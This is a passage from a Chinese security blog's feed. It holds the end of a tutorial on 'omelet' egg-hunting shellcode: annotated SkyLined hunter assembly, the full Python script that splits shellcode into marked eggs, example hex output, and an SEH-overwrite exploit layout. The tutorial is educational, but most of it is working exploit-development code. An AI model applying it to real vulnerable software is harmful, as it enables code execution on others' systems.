搜索下一字节&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;push edx                    ; 保存edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;push byte +0x02&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pop eax                     ; eax = 0x02，功能号，系统调用表可参考下列网址:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; http://www.metasploit.com/users/opcode/syscalls.html&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;int 0x2e                    ; 调用NtAccessCheckAndAuditAlarm&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmp al,0x5                  ; 判断是否访问违例（0xc0000005== ACCESS_VIOLATION)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pop edx                     ; 重储edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;je search_next_address      ; 如果地址不可读则跳走&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov eax,0x77303001          ; 若可读则将索引值与标记值赋予eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;add eax,ebx                 ; eax += ebx,这里ebx为egg内存块的计数器，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; 此时eax得到的就是各个内存块开头的标记marker，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; tag=773030&amp;lt;seq&amp;gt;,其中seq = 0x1 +  number_of_remaining_eggs_to_find + 0x1,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            ; 比如0x77303003，0x77303004……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xchg edi,edx                ; 交换edi与edx的值&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;scasd                       ; 搜索edi中是否存在eax中的标记&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xchg edi,edx                ; 将edi/edx的值再交换回来&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jnz find_egg                ; 若未找到相匹配的标记则跳走，否则edx指向找到的egg内存块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;copy_egg:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov esi,edx                 ; ESI = EDX，保存egg内存块地址到esi留作后用 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xor ecx,ecx                    ; ecx = 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;mov cl,egg_size             ; 复制的字节数，相当于每一egg内存块大小&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rep movsb                   ; 从esi复制到edi&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dec ebx                     ; 递增ebx,ebx为内存块计数器&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cmp bl,1                    ; 判断是否找到所有的egg内存块&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jnz find_egg                ; 没有则继续搜索&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;done:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;call get_target_loc         ; 重新定位重组后shellcode所在的地址&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;jmp edi                     ; 执行shellcode&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;以上分析的两份程序均是对各egg内存块进行搜索的egg-to-omelet hunter程序，SkyLined还提供了另一份代码用于将shellcode进行分段，构造出各段egg内存块数据，其文件名为w32_SEH_omelet.py，是用Python编写的。它主要是遵循SkyLined在w32_SEH_omelet.asm代码中所提到的算法进行计算，以获取各块egg中的字节大小size，索引值index，标记值marker（默认为0x280876），以及各egg中的部分shellcode代码，每块egg的大小是固定的（默认为127字节），不足的用’@’（0x40）填充。其核心代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Main&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(my_name, bin_file, shellcode_file, output_file, egg_size = &lt;span class=&quot;string&quot;&gt;&#39;0x7F&#39;&lt;/span&gt;, marker_bytes = &lt;span class=&quot;string&quot;&gt;&#39;0x280876&#39;&lt;/span&gt;)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (marker_bytes.startswith(&lt;span class=&quot;string&quot;&gt;&#39;0x&#39;&lt;/span&gt;)):        &lt;span class=&quot;comment&quot;&gt;# 判断标记marker_bytes是否以0x开头&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    marker_bytes = int(marker_bytes[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;:], &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)    &lt;span class=&quot;comment&quot;&gt;# 以16为基数（十六进制）进行整数转换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    marker_bytes = int(marker_bytes)    &lt;span class=&quot;comment&quot;&gt;# 以10为基数（十进制）进行整数转换&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (egg_size.startswith(&lt;span class=&quot;string&quot;&gt;&#39;0x&#39;&lt;/span&gt;)):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg_size = int(egg_size[&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;:], &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg_size = int(egg_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; marker_bytes &amp;lt;= &lt;span class=&quot;number&quot;&gt;0xFFFFFF&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Marker must fit into 3 bytes.&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; egg_size &amp;gt;= &lt;span class=&quot;number&quot;&gt;6&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Eggs cannot be less than 6 bytes.&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; egg_size &amp;lt;= &lt;span class=&quot;number&quot;&gt;0x7F&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;Eggs cannot be more than 0x7F (127) bytes.&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  bin = open(bin_file).read()            &lt;span class=&quot;comment&quot;&gt;# 读取bin_file文件,即负责搜索egg的bin文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  marker_bytes_location = ord(bin[&lt;span class=&quot;number&quot;&gt;-3&lt;/span&gt;])    &lt;span class=&quot;comment&quot;&gt;# 标记值marker&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  max_index_location = ord(bin[&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;])        &lt;span class=&quot;comment&quot;&gt;# 索引值index&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  egg_size_location = ord(bin[&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;])        &lt;span class=&quot;comment&quot;&gt;# 各egg内存块所占的字节数&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  code = bin[:&lt;span class=&quot;number&quot;&gt;-3&lt;/span&gt;]                        &lt;span class=&quot;comment&quot;&gt;# 用于存放分段后的部分shellcode代码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  shellcode = open(shellcode_file).read()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  max_index = int(math.ceil(len(shellcode) / (egg_size - &lt;span class=&quot;number&quot;&gt;5.0&lt;/span&gt;)))        &lt;span class=&quot;comment&quot;&gt;# 计算出每块egg的最大索引值，并要求其必须&amp;lt;=0xFF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;assert&lt;/span&gt; max_index &amp;lt;= &lt;span class=&quot;number&quot;&gt;0xFF&lt;/span&gt;, (&lt;span class=&quot;string&quot;&gt;&#39;The shellcode would require %X (%d) eggs of  %X &#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;string&quot;&gt;&#39;(%d) bytes, but 0xFF (255) is the maximum number of eggs.&#39;&lt;/span&gt;) % (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      max_index, max_index, egg_size, egg_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  marker_bytes_string = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; range(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    marker_bytes_string += chr(marker_bytes &amp;amp; &lt;span class=&quot;number&quot;&gt;0xFF&lt;/span&gt;)        &lt;span class=&quot;comment&quot;&gt;# 将标记值与0xFF进行与运算&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    marker_bytes &amp;gt;&amp;gt;= &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;        &lt;span class=&quot;comment&quot;&gt;# 右移8位，相当于将标记值转换成0x280876ff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  max_index_string = chr(max_index)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  egg_size_string = chr(egg_size - &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;)    &lt;span class=&quot;comment&quot;&gt;# 扣去字节大小（1字节），索引值（1字节）和标记（3字节）所占用的5字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;comment&quot;&gt;# insert variables into code&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  code = code[:marker_bytes_location] + marker_bytes_string + code[marker_bytes_location+&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  code = code[:max_index_location] + max_index_string + code[max_index_location+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  code = code[:egg_size_location] + egg_size_string + code[egg_size_location+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  output = [&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// This is the binary code that needs to be executed to find the eggs, &#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// recombine the orignal shellcode and execute it. It is %d bytes:&#39;&lt;/span&gt; % (&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      len(code),),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;omelet_code = &quot;%s&quot;;&#39;&lt;/span&gt; % HexEncode(code),&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// These are the eggs that need to be injected into the target process &#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// for the omelet shellcode to be able to recreate the original shellcode&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// (you can insert them as many times as you want, as long as each one is&#39;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;string&quot;&gt;&#39;// inserted at least once). They are %d bytes each:&#39;&lt;/span&gt; % (egg_size,) ]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  egg_index = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; shellcode:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg = egg_size_string + chr(egg_index ^ &lt;span class=&quot;number&quot;&gt;0xFF&lt;/span&gt;) + marker_bytes_string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg += shellcode[:egg_size - &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]        &lt;span class=&quot;comment&quot;&gt;# 构造出完整的egg内存块：size + index + marker + shellcode &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; len(egg) &amp;lt; egg_size:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &lt;span class=&quot;comment&quot;&gt;# tail end of shellcode is smaller than an egg: add pagging:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      egg += &lt;span class=&quot;string&quot;&gt;&#39;@&#39;&lt;/span&gt; * (egg_size - len(egg))    &lt;span class=&quot;comment&quot;&gt;# 每块egg的大小是固定的（默认为127字节），不足的用&#39;@&#39;（0x40）填充&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    output.append(&lt;span class=&quot;string&quot;&gt;&#39;egg%d = &quot;%s&quot;;&#39;&lt;/span&gt; % (egg_index, HexEncode(egg)))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    shellcode = shellcode[egg_size - &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    egg_index += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  open(output_file, &lt;span class=&quot;string&quot;&gt;&#39;w&#39;&lt;/span&gt;).write(&lt;span class=&quot;string&quot;&gt;&#39;\n&#39;&lt;/span&gt;.join(output))    &lt;span class=&quot;comment&quot;&gt;# 写入输出文件output_file&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;使用方法&quot;&gt;&lt;a href=&quot;#使用方法&quot; class=&quot;headerlink&quot; title=&quot;使用方法&quot;&gt;&lt;/a&gt;使用方法&lt;/h3&gt;&lt;p&gt;关于使用方法，其实很简单，使用命令如下：&lt;br&gt;C:\Users\riusksk&amp;gt; w32_SEH_omelet.py  w32_SEH_omelet.bin  shellcode.bin  output.txt  127  0xBADA55&lt;br&gt;它需要先生成两个bin文件，一个是shellcode.bin，还有一个用于egg搜索的w32_SEH_omelet.bin，这里用Peter Van Eeckhoutte编写的egg-to-omelet hunter程序来生成bin文件以代替w32_SEH_omelet.bin也是可以的。关于shellcode.bin，你可以先用metasploit先生成shellcode，然后用perl/python将shellcode写入一个bin文件即可；而w32_SEH_omelet.bin可直接用nasm去编译SkyLined的w32_SEH_omelet.asm或者Peter Van Eeckhoutte写的corelanc0d3r_omelet.asm从而得到此bin文件。Output.txt是输出文件，用来保存生成各个egg以及omelet代码，后面的127是每一块egg内存块的字节数，而0xBADA55是标记值，你也可采用其它3字节数据，比如w00(0x773030)，最后生成的输出文件内容类似如下：&lt;/p&gt;
&lt;figure class=&quot;highlight py&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;// This &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; the binary code that needs to be executed to find the eggs, &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; // recombine the orignal shellcode &lt;span class=&quot;keyword&quot;&gt;and&lt;/span&gt; execute it. It &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt; bytes:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; omelet_code = &lt;span class=&quot;string&quot;&gt;&quot;\x31\xFF\xEB\x23\x51\x64\x89\x20\xFC\xB0 ... \xFF\x50\x08&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; // These are the eggs that need to be injected into the target process &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; // &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; the omelet shellcode to be able to recreate the original shellcode&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; // (you can insert them &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; many times &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; you want, &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; long &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; each one &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; // inserted at least once). They are &lt;span class=&quot;number&quot;&gt;127&lt;/span&gt; bytes each:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; egg0 = &lt;span class=&quot;string&quot;&gt;&quot;\x3B\xFF\x76\x08\x28\x33\xC9\x64\x8B\x71\x30\x8B ... \x57\x51\x57&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; egg1 = &lt;span class=&quot;string&quot;&gt;&quot;\x3B\xFE\x76\x08\x28\x8D\x7E\xEA\xB0\x81\x3C\xD3 ... \x24\x03\xCD&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; egg2 = &lt;span class=&quot;string&quot;&gt;&quot;\x3B\xFD\x76\x08\x28\x0F\xB7\x3C\x79\x8B\x4B\x1C ... \x47\xF1\x01&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;生成文件后我们就可以在实际漏洞利用中构造出类似下面这样的exploit：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;【junk】【nseh(jmp 06)】【seh(pop pop ret)】【nops】【omelet_code】【junk】【egg0】【junk】【egg1】【junk】【egg2】&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;不过具体的实际漏洞利用还得受一些操作环境影响，得视具体情况进行变化，同时还需要一点运气！&lt;/p&gt;
&lt;h3 id=&quot;结语&quot;&gt;&lt;a href=&quot;#结语&quot; class=&quot;headerlink&quot; title=&quot;结语&quot;&gt;&lt;/a&gt;结语&lt;/h3&gt;&lt;p&gt;本文就Omelet Shellcode进行简单地分析，阐述了shellcode分段执行技术的基本原理，并对其使用进行简单的讲解，以帮助大家更好地理解并应用好Omelet Shellcode。在本文是笔者只是起到了一个抛砖引玉的作用，关于shellcode的编写还有很多技术性，同时也需要一定的艺术性，这些都需要靠大家共同来打造和分享，如果你有更多关于这方面的资料和技术，希望可以跟我分享’&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;由于在实际溢出利用中，我们可能会遇到内存中没有足够的空间来存放我们的shellcode，但我们又可以控制多块小内存空间的内容，那些此时我们就
    
    </summary>
    
      <category term="技术分享" scheme="http://riusksk.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="shellcode" scheme="http://riusksk.github.io/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>虚拟机检测技术剖析</title>
    <link href="http://riusksk.github.io/2010/08/27/vmcheck/"/>
    <id>http://riusksk.github.io/2010/08/27/vmcheck/</id>
    <published>2010-08-26T16:00:00.000Z</published>
    <updated>2016-06-23T03:00:16.000Z</updated>
    
